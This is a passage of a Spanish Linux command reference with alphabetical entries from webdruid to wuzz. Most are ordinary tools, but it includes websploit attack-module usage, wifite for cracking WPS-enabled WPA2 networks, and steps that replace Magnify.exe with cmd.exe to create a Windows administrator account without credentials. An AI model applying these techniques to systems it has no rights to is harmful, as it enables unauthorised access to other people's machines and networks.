Programa de análisis de archivos de registro de sitios web que produce estadísticas detalladas de visitas a sitios basadas en los registros de servidores como Apache o Nginx y en formato HTML para ver con un navegador. Contiene la aplicacion webdruid-resolve.
# webdruid /var/log/apache2/access.log (generar estadísticas sobre un archivo de logs web)
# webdruid -n www.mi_sitio_web.com -o /var/www/html/weblogs/ /var/log/apache2/access.log (-n: nombre del host que aparecerá en los informes y -o: directorio de salida donde se guardarán los informes)
Configuración básica:
# nano /etc/webdruid/webdruid.conf.
con el contenido:
    LogFile /var/log/apache2/access.log    # Archivo de log a analizar
    LogType clf                            # Tipo de log (clf para "Common Log Format" formato común de Apache)
    OutputDir /var/www/html/weblogs/       # Directorio de salida para los informes HTML
    HostName www.mi_sitio_web.com          # Nombre del sitio para los informes
    Incremental yes                        # Habilita el modo incremental (procesa solo los nuevos logs)
# webdruid -c /var/log/apache2/access.log (analizar solo las nuevas líneas que se agregan al archivo de logs)
Los informes en el ejemplo expuesto se abren con el navegador en la ruta /var/www/html/weblogs/index.html
1- Se puede usar com cron, por ejemplo, para que resalice un informe cada dia a las 00:00 horas
   0 0 * * * /usr/bin/webdruid -c /var/log/apache2/access.log


webfsd
Sencillo servidor HTTP para contenido estático. Carece de archivos de configuración por lo que todas sus funcionalidades se pueden controlar por parámetro. Acceso por navegador con http://url_o_ip:puerto.
$ webfsd -r /home/usuario/videos -p 12001 (Compartir el directorio "videos" por el puerto 12001 y actuando como demonio. Matar el proceso con killall webfsd)
$ webfsd -F -r /home/usuario/videos -p 12001 -b pepe:1234 (Solicitando nombre de usuario y contraseña y sin actuar como demonio [-F]. Matar el proceso con Ctrl+c)


webkit2pdf
Descargar la portada de una página web y pasarla a pdf.
$ webkit2pdf -f test.%02d.pdf -o web http://lapipaplena.net (Que la descargue y la guarde [f] en formato "test.00.pdf" y en el directorio web [o])


webood
[mplayer python-weboob-core] Colección de aplicaciones capaces de interactuar con los sitios web sin necesidad de que el usuario abra un navegador. Varias de las aplicaciones que lo integran son especificas para usuarios franceses. En el tractatus se han desarrolado sólo (Ver): geolooc (geolocalizar direcciones IP), videoob (búsqueda de vídeo), weboorrents (búsqueda de torrents) y wetboobs (pronóstico del tiempo). La instalación a partir de los repositorios (Debian) producía ciertos errores en la salida de algunos comandos. La solución pasa por descargar el zip de github:
	$ wget https://github.com/frankrousseau/weboob/archive/master.zip
	$ unzip master.zip
	$ cd weboob-master
	# python setup.py install
$ weboob-config update (Actualizar)
$ weboob-config disable geolocip (Desactivar un módulo. Este concretamente da errores. "enable" para activarlo)
$ weboob-config list (Listar los módulos)
$ weboob-config add youporn (Añadir un módulo)
$ weboob-config info btmon (Información sobre un módulo)


weboorrents
[webood (Ver)]. Descarga de torrents.
$ weboorrents (Entrar en el prompt)
weboorrents> search kali (Mostrar salida para "kali")
weboorrents> info 7 (Informaciónj sobre la salida "7" dels listado anterior)
weboorrents> getfile 7 (descargar el torrent o magnet "7")
weboorrents> quit (Salir del prompt)


webp
Reduce la medida de imagenes jpeg y png. Es una herramienta de google que, de momento [2013] el formato webp sólo es compatible con algunos navegadores [chromium y Opera] pero puede usarse para comprimir una imagen para acto seguido descomprimirla de nuevo: La reducción de peso es considerable.
$ cwebp -q 60 entrada.png -o salida.webp (Compresión al 70 %. Por defecto 75)
$ dwebp entrada.webp -o salida.png (Descompresión)


webpng
Información de imágenes .png
$ webpng -d imagen.png (medidas y otras caracteristicas)
$ webpng -l imagen.png (tabla de colores indexados)


websploit
Explotación de vulnerabilidades y ataques en red. Contiene varios módulos divididos en: web, red, explotación y wifi. Descarga: http://sourceforge.net/projects/websploit/
Uso básico:
# websploit (Lanzar la aplicación y entrar en el prompt)
wsf > show modules (Ver los mudulos disponibles)
wsf > use network/webkiller (Escoger el módulo que se va a usar)
wsf > show options (Ver los parámetros que han de entrarse)
wsf > set target http://192.168.1.10 (Entrar el/los parámetros que solicite "show options")
wsf > run (Iniciar el ataque)
Otros comandos:
wsf > os ip a (Lanzar un comando externo, "ip a" en este caso)
wsf > update (Comprobar actualizaciones)
wsf > upgrade (Aplicar las actualizaciones)
wsf > back (Salir del módulo actual)
wsf > stop (Para el ataque o el scaneo)


weechat-curses
chat irc.
Comandos básicos (Comunes para aplicaciones relacionadas con chat irc):
	/connect irc.irc-hispano.org (Conectar con un servidor)
	/nick obama (Ponerse un alias)
	/list (Listado de las salas disponibles)
	/join #ubuntu (conectar con una sala)
	/part #ubuntu (Salir de una sala)
	/partall (Salir de todas las salas)
	/exit (Salir de IRC)
	/quit hasta la proxima (Salir dejando un mensaje)
	/whois nick (Información del usuario con el nick especificado)
	/who #canal (Muestra información sobre un canal)
	/query nick (Abrir una linea con una persona)
	/help (Muestra la ayuda)
	/me Linux es genial (Muestra el mensaje)
	/away Estoy durmiendo (Muestra que estamos ausentes)
	/notice Aquí estoy (Mandar un texto en forma de notificación)
	/ison nick (Indica si un nick está conectado)
	/ignore nick (Permite ignorar a un usuario)
	/send nick archivo (Permite enviar un archivo a un usuario)
	/log on/off (Activa o desactiva la grabación de la conversación actual)


wetboobs
[weboob (Ver)]. Previsión del tiempo. Precisa activar el módulo weather (Ver weboob).
$ wetboobs (Entra en el prompt)
wetboobs> cities girona (Muestra todas las opciones geograficas de "girona")
wetboobs> current 1 (Muestra la previsión para el dia actual de la opción 1 del listado anterior)
wetboobs> forecast 3 (Muestra la previsión de varios dias de la opción 1)
wetboobs> quit (Salir del prompt)


wezterm
Potente emulador y multiplexor de terminal multiplataforma. Las funciones más llamativas son: Ligaduras [Fira Code, JetBrains Mono, etc.] perfecto para programar o trabajar con símbolos, font fallback automático que significa que si una fuente no tiene cierto carácter, usa otra sin romper la línea y live reload de la configuración, es decir que si se cambia algo en el archivo Lua se aplica sin reiniciar.
Crear o editar el archivo de configuración
$ nano ~/.config/wezterm/wezterm.lua
       local wezterm = require 'wezterm'
       return {
         color_scheme = "Gruvbox Dark",
	 font = wezterm.font("JetBrains Mono"),
  	 font_size = 12.0,
  	 hide_tab_bar_if_only_one_tab = true,
  	 enable_wayland = false,
       }
$ wezterm cli list --format json (lista todas las pestañas y paneles activos en formato JSON)
$ wezterm cli spawn --cwd /ruta/especifica (crea un nuevo panel en el directorio actual)
$ wezterm start --cwd ~/Vídeos (abrir la terminal en el directorio especificado)
$ wezterm imgcat archivo.png (mostrar una imagen. Ha de estarse en la terminal wezterm)
$ wezterm imgcat -- imagen.png (centra la imagen)
$ wezterm imgcat --width 50 staredsi.png (escala la imagen al 50%)
$ wezterm ls-fonts --list-system (ver listado de fuentes disponibles)
$ wezterm ssh USER@servidor (SSH con pestañas automáticas)
$ wezterm show-keys (ver listado de atajos de teclado)
$ wezterm serial --device /dev/ttyUSB0 (ejecutar un serial para dispositivos serie)


wget
Realizar descargas de una web. Soporta protocolo http, https y ftp.
$ wget http://www.ubuntu.org/ubuntu.iso  (descarga básica)
$ wget http://www.tuxapuntes.com (descargar página incial del sitio web)
$ wget http://www.ubuntu.org/ubuntu.iso ftp://www.debian.org/debian5.iso (varias descargas)
$ wget -i archivo.txt  (Realizar las descargas enumeradas en archivo.txt)
$ wget --limit-rate=60k ftp://ftp.ubuntu.org/hardy.iso (limitar ancho banda)
$ wget -p http://www.tuxapuntes.com (todos los elementos extras)
$ wget -c http://direccion_de_la_descarga.com (reiniciar descarga interrumpida)
$ wget --spider  --no-parent -r -o log.txt http://web.com (lista enlaces rotos)
$ wget -m -p -k -P DIR http://www.tuxapuntes.com (descargar todo un sitio recursivamente [-m], todo tipo de recursos, css, imágenes y demás para que se vea localmente [-p] y convierte los enlaces a accesibles de forma local [-k] y se guarde en el directorio "DIR")
$ wget -r -p -U Mozilla https://blog.desdelinux.net/ (para burlar los sitios web que verifican la identidad del navegador para aplicar diversas restricciones)
$ wget --wait=20 --limit-rate=20K -r -p -U Mozilla http://url.com (lo mismo pero haciendo pausas entre páginas y simulando ser un navegador)
$ wget -O - -q http://checkip.dyndns.org/ | cut -d':' -f2 | cut -d'<' -f1| cut -c2- (Conocer la ip publica)
$ wget -O - -q http://whatismyip.org/ (Lo mismo)
$ wget –http-user=usuario –http-password=contraseña URL (Descargar con usuario y contraseña)
$ wget –ftp-user=usuario –ftp-password=contraseña URL (Lo mismo con protocolo ftp)
1.-
Muestra para la descarga de una web completa:
$ wget http://www.server.com/login.php --post-data "user=Usuario&password=Contraseña" --save-cookies website.cookie --no-check-certificate -O - > /dev/null
Los argumentos:
	post-data (Especificamos los parámetros a pasarle al script para que nos autentique, en este caso "user" y "password" pero esto varia según la web)
	save-cookies (Indicamos donde guardar el archivo con la cookie, esta cookie será necesaria después para descargar la web con nuestra sesión iniciada)
	no-check-certificate (No comprobar el certificado del servidor con las entidades emisoras de certificados)
	-O - (No generar un archivo de salida ya que solo cogeremos la cookie)
Una vez obtenido el cookie:
$ wget -rkcp  -e robots=off -U Mozilla --limit-rate=80K --random-wait --load-cookies website.cookie --domains server.com --html-extension http://www.server.com
Los argumentos:
	-r (indica que descarge toda la web recursivamente)
	-c (En caso de que queramos retomar la descarga después o si fallase, este parámetro le indica que retome la descarga por donde se interrumpió)
	-e robots=off (Ignorar el archivo robots.txt, si existe en el servidor)
	-U Mozilla (Especifica el User-Agent de Mozilla Firefox en las cabeceras HTTP, útil para ciertas webs que bloquean algunos User-Agents)
	--random-wait (Espera un tiempo aleatorio entre una petición y otra para evitar un posible colapso en la web o ser detectados por algún sistema de seguridad)
	--load-cookies (Carga la cookie de sesión previamente descargada)
	--domains server.com (Indica que solo descarge el contenido de la web especificada y que no siga las urls externas encontradas)
	--html-extension (Guarda todos los documentos en formato HTML)


whatis
Mostrar una breve descripción de un comando.
$ whatis ifconfig


what-patch
Detectar qué sistema de parches utiliza un paquete Debian. what-patch debe ejecutarse desde el directorio raíz del paquete fuente de Debian.
# what-patch -v


whatportis
Comando para buscar a qué número de puerto corresponde un servicio o qué servicio corre por un puerto. Descarga de <https://github.com/ncrocfer/whatportis> o mediante la aplicacion pip [pip install whatportis]
$ whatportis ssh
$ whatportis 5432
$ whatportis mysql --like (Cuando no se conoce exactamente el nombre del servicio)


whatweb
Identifica sitios web: tecnología web, sistemas de gestión de contenidos [CMS], plataformas de blogs, estadística, bibliotecas JavaScript, servidores, dispositivos embebidos, direcciones de correo, versiones, errores SQL.... cuenta con más de 1600 plugins.
$ whatweb -l (Muestra listado de plugins)
$ whatweb -I nginx (Información sobre los plugins relacionados con "nginx")
$ whatweb URL (Uso básico)
$ whatweb -a 3 -v URL (Con un nivel agresivo [a 1: pasivo, a 3: agresivo y a 4: muy agresivo] usando todos los plugins [por defecto], y que muestre toda la información [v])
$ $ whatweb -p nginx URL (Sólo usar un plugin)
$ whatweb 192.168.1.0/24 (Que analice toda una red)


when
Agenda personal.
$ wget http://www.lightandmatter.com/when/when.tar.gz
$ tar -zxvf when.tar.gz
$ cd when_dist
# make install
La primera vez que se lance preguntará donde queremos el directorio personal [por defecto en .when]: pulsar "y" y el editor que queremos [por defecto emacs] yo puse "nano", siempre sin las comillas.
Colocar en .bashrc un alias para que muestre la información en español:
$ nano .bashrc
Añadir la linea:
alias when='when --language=es'
Si no tenemos ninguna entrada en .when/calendar al lanzar:
$ when (Mostrará fecha actual)
Para entrar datos:
$ nano .when/calendar
El formato de los datos es:
2013 mar 19 , Gritar tres veces: Stallman es un genio...
Una vez entrados los datos al lanzar:
$ when
Mostrará la fecha actual y los datos más proximos.
Nota.- La abreviatura de los meses ha de ser en inglés: jan, feb, mar, apr, may,jun, jul, aug, sep, oct, nov, dec.


whereami
Es un conjunto de scripts útiles y un sistema de coordinación para reubicar automáticamente su computadora dentro del entorno de red.
# whereami (forma básica informando las coordenadas)
# whereami -f human (ubicación más entendible)
# whereami -r (todavía más especifica)


whereis
Para encontrar donde se ha instalado un programa, su manual, ...
$ whereis firefox


which
Para encontrar el ejecutable si está en el path
$ which firefox


which.debianutils
Igual que el comando which. Devuelve los nombres de ruta de los archivos, enlaces o ejecutables.
$ which.debianutils liferea


which-pkg-broke
Encontrar qué paquete podría haber roto otro. En algunas distros  puede aparecer como which-pkg-broke-build
$ which-pkg-broke firefox


while
Ejecuta una seria de comandos mientras que una determinada condicion sea cumpla. Algunos scripts ilustrativos:
1.-
	#!/bin/bash
	RESPUESTA=s
	while [ $RESPUESTA = s ]
	do
		echo "Introducir nombre: "
		read NOMBRE
		echo "Hola $NOMBRE"
		echo
		echo "¿Desea continuar? (s/n)"
		read RESPUESTA
	done
2.-
	#!/bin/bash
	while [ "$OPCION" != 5 ]
	do
		echo
		echo "[1] Listar directorio"
		echo "[2] Directorio donde te encuentras"
		echo "[3] fecha de hoy"
		echo "[4] Usuarios conectados"
		echo "[5] Salir"
		echo
		read -p "Ingrese una opción: " OPCION
		echo
		case $OPCION in
			1) ls;;
			2) pwd;;
			3) date +%D ;;
			4) who;;
			5);;
			*) echo "Opción ingresada no valida, intentelo de nuevo";;
		esac
	done
	exit 0
3.-
	#!/bin/bash
	# imprimir números del 1 al 10
	LIMITE=10
	a=1
	while [ "$a" -le $LIMITE ]
	do
	  echo "$a "
	  let "a+=1"
	done
4.-
Leer un archivo linea a linea:
	#!/bin/bash
	while read linea
	do
	   echo "---> $linea "
	done < archivo.txt
5.-
Especificando un separador [:]
	#!/bin/bash
	while IFS=: read user pass uid gid full home shell
	do
	echo -e "$full :\n\
		    Pseudo : $user\n\
		    UID :\t $uid\n\
		    GID :\t $gid\n\
		    Home :\t $home\n\
		    Shell :\t $shell\n\n"
	done < /etc/passwd
6.-
Leer un archivo pasado como parámetro, descartar las lineas en blanco y colorear alternativamente las siguientes en amarillo y rojo.
	#!/bin/bash
	COLOR=1
	while read linia
	do
		if [ -z "${linia}" ]
		then
			continue
		fi
		if [ $COLOR -eq 0 ]
		then
			echo -e "\e[1;30;41m$linia\033[0m" #VERMELL - 0
			COLOR=1
		else
			echo -e "\e[1;30;43m$linia\033[0m" #GROC - 1
			COLOR=0
		fi
	done < $1


whiptail
Muestra ventanas en consola. Parecido a dialog con menos opciones.


who
[whowatch]. Muestra información sobre los usuarios que están conectados al equipo.
$ who -b (Tiempo desde el último arranque del sistema)
$ who -d (Procesos truncados)
$ who -r (Informa del runlevel activo)
$ who am i (usuario, número de terminal y fecha de entrada en dicha terminal)


whodepends
Comprueba qué paquetes dependen de un paquete dado y da los nombres y direcciones de correo electrónico de todos sus mantenedores
$ whodepends firefox
$ whodepends nano


who-permits-upload
Busca los permisos de carga del Mantenedor de Debian (DM) proporcionados desde ftp-master.debian.org y los analiza de forma legible por humanos. La herramienta puede buscar por nombre de DM, patrocinador (la persona que otorgó el permiso) y por paquete.
$ who-permits-upload -s sponsor "Marco d'Itri"
$ who-permits-upload -s uid whois
$ who-permits-upload apache2


who-uploads
Identifica las tres últimas versiones descargadas del paquete dado. Los cargadores se identifican utilizando sus llaves gpg o gpg2; la instalación de una versión reciente del paquete debian-keyring debería proporcionar la mayoría de las claves requeridas. Debido a que el PTS usa paquetes fuente, ha darse los nombres del paquete fuente, no los nombres del paquete binario.
$ who-uploads -M 5 emacs25 (dando la fecha de cada versión y de las últimas 5 del paquete mencionado)
$ who-uploads --no-date firefox (sin mencionar la fecha del paquete firefox)


whoami
Muestra el usuario con el que estamos. Misma salida que id -un [ver]
$ whoami


whois
Conocer los datos del registro de un dominio. Especificar sin las www
$ whois todo-linux.com


wicd-curses
conexiones a una red inalambrica.
$ wicd-curses
Si hay redes libres seleccionar la red y presionar la tecla C. Si existen redes  con seguridad habilitada, situarnos en la red con la que deseemos conectar, y presionar la tecla -> [la flecha derecha]. Mostrará otro menu donde ingresar  protocolo de seguridad y clave.


wicd-gtk
Applet de wicd para el area de notificación (tray)
$ wicd-gtk -a


wifite
[aircrack-ng reaver]. Crackear redes wpa2 con el "Wi-fi protected setup" activo.
# wifite (Inicia el proceso)


wikipedia2text
Consultar en la wikipedia y ver la consulta por terminal o por el navegador.
$ wikipedia2text -b chromium -l es emacs (ver la consulta con chromium y en español)
$ wikipedia2text -l es girona (ver la consulta por terminal)
$ wikipedia2text -o -l es emacs (por navegador de terminal)
$ wikipedia2text -r -l es (ver consultar aleatorias de la wikipedia en español)


wikit
Buscador en la wikipedia por teminal.
$ wikit -l es mostaza (Buscar mostaza en la wikipedia en castellano)
$ wikit -b linux (abrir el articulo de la definición en el navegador)
$ wikit -d linux (abrir en el navegador la página de parecidos)


windows
1.-
Redimensionar desde windows:
Botón derecho en: Mi PC \ Administrar o Inicio \ Panel de control \ Herramientas administrativas \ Administracion De Equipos. Clicar con el boton derecho sobre la particion que queremos modificar. Aparecen dos opciones:
* Extend Volume
* Shirnk Volume
La opcion de Shrink Volume es la que nos permite liberar espacio de la partición. Windows moverá los archivos necesarios en su interior. Igualmente informá del tamaño maximo que puede liberar con garantias de integridad de datos. El espacio libre podremos particionarlo posteriormente usando herramientas clásicas como gparted.
2.-
Re-dimensionar desde Linux:
Cuando a gparted le resulta imposible re-dimensionar particiones ntfs [con vista, por ejemplo] usaremos un Live con las herramientas ntfsprogs [puppy, entre otras]. Previamente habremos desfragmentado la partición win y, si procede, reparados posibles errores de disco desde la consola del sistema [cmd] lazando chkdsk /c
Arrancado el Live, averiguamos el nombre de la partición:
# fdisk -l | grep NTFS
Si no hemos lanzado chkdsk en win, con linux podemos reparar los posibles errores con:
# ntfsfix /dev/sdax
Comprobar si detecta correctamente la partición win:
# sudo ntfsresize -P -i -f -v /dev/hda1 --ad-sectors
ntfsresize v2.0.0 (libntfs 10:0:0)
Device name : /dev/hda1
NTFS volume version: 3.1
...
Ordinary : 55549 MB 49454
You might resize at 25961267200 bytes or 25962 MB (freeing 32608 MB).
Please make a test run using both the -n and -s options before real resizing!
Indica cuánto podemos redimensionar (25962 MB) y cuánto espacio quedaría libre (32608 MB).Suponemos que deseamos dejar el sistema de ficheros en 29055000000 by (29055 MB). Primero lo simulamos (recomendable realizar la prueba varias veces):
# ntfsresize -f -s 29055000000 -n /dev/hda1 --bad-sectors
ntfsresize v2.0.0 (libntfs 10:0:0)
Device name : /dev/hda1
NTFS volume version: 3.1
...
ERROR: Extended record needed (1096 > 1024), not yet supported!
Please try to free less space.
Indica que no se ha dejado suficiente espacio para desplazar los datos.
dejamos más espacio:
# ntfsresize -f -s 31055000000 -n /dev/hda1 --bad-sectors
ntfsresize v2.0.0 (libntfs 10:0:0)
Device name : /dev/hda1
...
Updating Boot record …
The read-only test run ended successfully.
La simulación sale correcta, procedemos a aplicarla quitando el parámetro -n
# ntfsresize -f -s 31055000000 /dev/hda1 --bad-sectors
ntfsresize v2.0.0 (libntfs 10:0:0)Device name : ...
...
Syncing device …
Successfully resized NTFS on device ‘/dev/hda1′.
3.-
Crear un usuario administrador en windows [7, server 2008...]
Arrancar con un Live-cd y montar la partición win.
Entrar en C:\Windows\System32
Borrar el archivo Magnify.exe
Copiar el fichero cmd.exe y renombrar como Magnify.exe
Reiniciar para que arranque Windows.
Ejecutar la herramienta de lupa y arrancará una ventana de comandos como usuario administrador
Crear un usuario administrador:
net user /add admin
net localgroup administrators admin /add
net user admin *
Reiniciar win y entrar con el usuario creado.


wine
Ejecuta programas de Windows en Linux
$ wine programa.exe
$ winecfg (Abre la ventana de configuración)
1.-
En distros de 64 bits, ejecutar wine en modo 32 bits
Se debe eliminar o mover la carpeta ~/.wine y recrearla de nuevo. Primero se realiza un export de la variable WINEARCH en la terminal
$ export WINEARCH=win32
Y luego se ejecuta wine de nuevo
$ wine programa32bits.exe


winetricks
Herramienta para instalar librerias y complementos para wine
$ winetricks (ejecuta la interfaz gráfica del programa)
$ winetricks corefonts (Instala fuentes como Arial y Verdana)
Más referencias de winetricks aqui: <http://wiki.winehq.org/winetricks>


wipe
Borrado de archivos, directorios, particiones o discos de forma segura.
$ wipe archivo (Sobreescribiendo 34 veces el espacio)
$ wipe -fq (Sin pedir confirmación y sólo reescribiendo 4 veces)
$ wipe -rq -Q 10 -i -c DIR/ (Que suprima los subdirectorios [r], que haga 10 pasadas y no sólo 4 [-q -Q 10], que muestre detalles [-i] y por si tienen permisos que chmod entre en acción [c]


wird
Frontend basado en ncurses para recordatorios, cálculo de fechas, fases lunares, salida y puesta del sol, calendario hebreo, alarmas, mensajes multilingües y manejo adecuado de los días festivos. Muestra en una tabla de tiempo navegable junto con un calendario y permite al usuario crear nuevos recordatorios con o sin tiempo.
$ wird


wiremix
Mezclador de audio para el servidor de audio PipeWire que permite ajustar volúmenes, enrutar el audio entre diferentes dispositivos y aplicaciones, y configurar ajustes de los dispositivos de audio. Descargar de https://github.com/tsowell/wiremix.
$ wiremix (iniciar la aplicación)
Para navegar:
Flechas o h/j/k/l --> Navegar y ajustar el volumen.
Tab --> Para cambiar entre las diferentes pestañas: Reproducción, Grabación, Salida ...
c --> Abre un menú desplegable para enrutar el audio a un destino diferente.
m --> Silenciar/activar el sonido.
d --> Establecer un dispositivo de entrada o salida como predeterminado.
q --> Salir de la aplicación.


wkhtmltopdf
Pasar una página web o un archivo html a pdf
$ wkhtmltopdf tuxapuntes.com tuxapuntes.pdf
$ wkhtmltopdf -O Landscape -s A4 file.html file.pdf (Apaisado y A4)
Algunas opciones:
-O Portrait	(Vertical)
-s A3


wmbattery
Pequeña ventana que se abre en el escritorio y muestra la carga de la bateria.
$ wmbattery


wmcalclock
Abre una pequeña ventana en el escritorio y muestra calendario, hora de Greenwich, hora sideral media de Greenwich y hora sideral local.
$ wmcalclock -24 -S (Formato 24 horas y sin mostrar los segundos)


wmclok
Abre una pequeña ventana en el escritorio que muestra calendario en inglés y la hora
$ wmclock -12 -led gold (formato 12 horas y color de la letra dorada)


wmclockmon
Abre una pequeña ventana en el escritorio que muestra un reloj como wmtime, pero con un temporizador de alarma y diferentes estilos.
$ wmclockmon -a 17:33 (Con alarma a las 17'33)


wmclockmon-cal
[wmclockmon]. Pequeña ventana que se abre en el escritorio y muestra el calendario del mes actual
$ wmclockmon-cal


wmcpu
Pequeña ventana que se abre en el escritorio y muestra información sobre la CPU. la memoria, la swap y tiempo de actividad.
$ wmcpu


wmcpuload
Pequeña ventana que se abre en el escritoria y muestra el uso actual de la CPU como valor porcentual y gráfico con una apariencia similar a LCD.
$ wmcpuload -a 50 (Que muestre alarma al llegar a 50% de uso. Por defecto 90)


wmctrl
Interactuar con las ventanas
$ wmctrl -l (Muestra el ID de todas las ventanas)
$ wmctrl -s 2  (Ir al escritorio 3 [la primera es la 0])


wmdate
Pequeña ventana que se abre en el escritorio que puestra ucomo una hoja de calendario en inglés.
$ wmdate


wmdiskmon
Pequeña ventana que se abre en el escritorio que muestra el uso del disco.
$ wmdiskmon


wmfire
Pequeña ventana que se abre en el escritorio que muestra el uso actual de la CPU como un fuego bonito y ardiente.
$ wmfire


wmforkplot
Pequeña ventana que se abre en el escritorio y supervisa la actividad del núcleo y muestra una lista de los procesos que consumen más CPU.
$ wmforkplot


wmfrog
Pequeña ventana que se abre en el escritorio que proporciona informes meteorológicos. Precisa configurar la estación de la que se quiere monitorizar el tiempo [FAA, WMO]
$ wmfrog -s FAA -delay 10 (usando FAA y que se actualice cada 10 minutos. Por defecto 15)


wmfsm
Abre una pequeña ventana en el escritorio que muestra hasta qué punto se utilizan los sistemas de archivos montados.
$ wmfsm


wmgtemp
Pequeña ventana que se abre en el escritorio y muestra gráficamente las temperaturas de CPU y SYS de las placas base compatibles con lm_sensors. Para hacer que wmgtemp funcione precisa configurar lm_sensors.
$ wmgtemp


wmhdplot
Abre una pequeña ventana en el escritorio y monitore los discos duros a base de estímulos visuales cada vez que su /dev/hdx escribe o lee algo.
$ wmhdplot


wmifinfo
Abre una pequeña ventana en el escritorio que muestra información básica de red para todas las interfaces disponibles. Muestra la dirección IP, la máscara de red, la puerta de enlace y la dirección MAC de forma similar a ifconfig.
$ wmifinfo


wmifs
Pequeña ventana que se abre en el escritorio y monitorea todas las interfaces de red.
$ wmifs


wmitime
Muestra en una pequeña ventana en el escritorio una aplicación de base reloj, que muestra la hora estándar y la fecha. La característica única es que también puede mostrar el tiempo de Internet con notación @TIME.
$ wmitime


wmload
Muestra en una pequeña ventana en el escritorio una representación gráfica del núcleo/sistema y estadísticas.
$ wmload


wmmatrix
Muestra matrix en una pequeña ventana en el escritorio.
$ wmmatrix


wmmemload
Muestra en una pequeña ventana en el escritorio la memoria actual y el uso de intercambio como un valor porcentual.
$ wmmemload


wmmisc
Monitorea la cantidad de usuarios conectados, total de procesos, cantidad de procesos en ejecución y promedio de carga del sistema. Abre una pequeña ventana en el escritorio.
$ wmmisc


wmmon
Monitor de la carga de la CPU en tiempo real, así como la carga promedio del sistema y también brinda algunas características adicionales. Abre una pequeña ventana en el escritorio.
$ wmmon -s (Empezar en modo información del sistema, uso de la memoria, uso de intercambio y el tiempo de funcionamiento)


wmnd
Muestra un gráfico de tráfico entrante/saliente, indicadores de actividad para rx/tx y velocidad actual máxima para rx/tx en bytes o paquetes.
$ wmnd (uso básico)
$ wmnd -I eth0 (especificando interfaz de red)


wmshutdown
Aplicación de muestra en el escritorio un aplet que permite apagar o reiniciar la máquina simplemente haciendo clic y confirmando.
$ wmshutdown


wnpp-alert
Comprobar si hay paquetes instalados en adopción o huérfanos. Descarga las listas de paquetes que han quedado huérfanos (O), están en adopción (RFA), o que el responsable ha pedido ayuda (RFH) de las páginas web de WNPP y los muestra en una lista.
$ wnpp-alert


wnpp-check
Comprueba si un paquete se está empaquetando (ITPed) o si se ha solicitado un paquete (RFPed) desde el sitio web de WNPP <https://www.debian.org/devel/wnpp> y enumera los paquetes que se incluyen en la línea de comando que aparecen en esas listas.
$ wnpp-check paquete


wodim
Grabación de cds i dvds
$ wodim -v -eject dev=/dev/cdrw -data imagen.iso  (Grabar una iso)
$ wodim -v -eject dev=/dev/dvd -data imagen.iso  (Grabar imagen en un DVD)
$ wodim -v -eject blank=fast dev=/dev/cdrw  (Borrar un CD)


wondershaper
Limitar el ancho de banda de la conexion de una red. Prioriza telnet y ssh sobre tráfico web, y este sobre las descargas de datos. Para limitar aplicaciones ver trickle.
# wondershaper eth0 (Muestra el estado de la red eth0)
# wondershaper eth0 1024 512 (limita la conexión a 1024 kbps de bajada y 512 kbps de subida)
# wondershaper clear eth0  (Elimina los ajustes realizados en la red especificada)


wordgrinder
Procesador de textos sencillo para escribir borradores. Es un paquete provisional. Ctrl-q para salir


wordplay
Buscador de anagramas o sea buscar una palabra o frase hecha al transponer las letras de otra palabra o frase. El idioma empleado es el inglés. Cada letra del anagrama debe aparecer con la misma frecuencia que en la cadena original.
$ wordplay university (Anagrama de la cadena "university")
$ wordplay university -lx (lista las palabras que se pueden deletrear usando las letras "university")
$ wordplay university -n3m8 (Anagrama de la cadena "university" usando palabras de más de 3 letras y menos de 8)
$ wordplay university -ld3m10 -f /usr/share/dict/words (Imprimir anagramas que contengan hasta 3 palabras, sin considerar ninguna palabra de más de 10 caracteres y utilizando el archivo "/usr/share/dict/words" en lugar de "words721.txt" que es el por defecto)
$ wordplay university -slx (Imprime la lista de palabras de la cadena "university". La salida consistirá sólo en las palabras [s])


wormhole
[magic-wormhole]. Envio de archivos o directorios entre computadoras usando un código de un solo uso. la máquina emisora genera y muestra el código, que debe ser escrito en la máquina receptora. El ejemplo que sigue es sacado de la pàgina del proyecto <https://github.com/warner/magic-wormhole>
En la máquina emisora:
	$ wormhole send README.md
	Sending 7924 byte file named 'README.md'
	On the other computer, please run: wormhole receive
	Wormhole code is: 7-crossover-clockwork
En la máquina receptora:
	$ wormhole receive
	Enter receive wormhole code: 7-crossover-clockwork
	Receiving file (7924 bytes) into: README.md
	ok? (y/n): y
	Receiving (->tcp:10.0.1.43:58986)..
	100%|===========================| 7.92K/7.92K [00:00<00:00, 120KB/s]
	Received file written to README.md


worms
Muestra gusanos en la terminal.
$ worms -d 200 -n 4 -l 4 (lento [-d] por defecto 0. 200 máximo, mostrando 4 gusanos [-n] Por defecto 3 y con longitud de 4 caracteres [-l]. Por defecto 16.


wput
Subir ficheros a un servidor ftp.
$ wput file ftp://USER:PASS@192.168.1.10/home/usuario/dir/
$ wput *.txt ftp://USER:PASS@host.com/home/usuario/ (Subir todos los .txt del directorio local al host remoto)


write
Enviar mensajes a la terminal de usuarios conectados remotamente a nuestra máquina.
$ write usuario /dev/pts/15  (Iniciar el promt para la comunicación con el usuario de la terminal número 15. Este a su vez, para responder, debe lanzar write hacia la consola del otro usuario)


wspanish
El paquete contiene una lista alfabética de algunas palabras en español. No pretender ser una lista de palabras completa y muchas palabras No están completamente expandidas. Se almacena en el directorio /usr/share/dict/


wttr
Servicio de predicción meteorológica y fuentes de datos para la información del pronóstico del tiempo. Admite varios métodos de presentación (curl, httpie, wget, HTML para navegadores, png...)
$ curl wttr.in/Figueras,Gerona (especificando ciudad y provincia)
$ curl -H 'Accept-Language: es' -s wttr.in/figueras,girona | sed -n '1,7p' (solo lo básico de una ciudad y en español)
$ curl -H 'Accept-Language: es' -s wttr.in/sant+joan+de+les+abadesses,girona (para una ciudad con varias palabras)
$ curl wttr.in/Moon?lang=es (ver estado de la luna y en español)
$ curl wttr.in/~Eiffel+Tower (especificar algo que no es una población)
$ curl wttr.in/@lapipaplena.org (la situación de un dominio)
$ wget wttr.in/Figueras,Gerona.png (bajar una imagen de la población seleccionada)


wuzz
Herramienta interactiva para generar y enviar solicitudes HTTP, así como para ver las respuestas. En lugar de tener que especificar los encabezados TTP, parámetros, cuerpo, etc. en la línea de comandos, se puede usar un CUI (interfaz de usuario de consola) simple e intuitivo.
$ wuxx (entrar en el prompt)
Movimiento por la pantalla:
	* Ctrl+R - Enviar solicitud.
	* Ret - Enviar la solicitud desde la URL de la ventana solamente.
	* Ctrl+C - Salir.
	* Ctrl+K , Mayús+Tab - Vista anterior.
	* Ctlr+J , Tab - Siguiente vista.
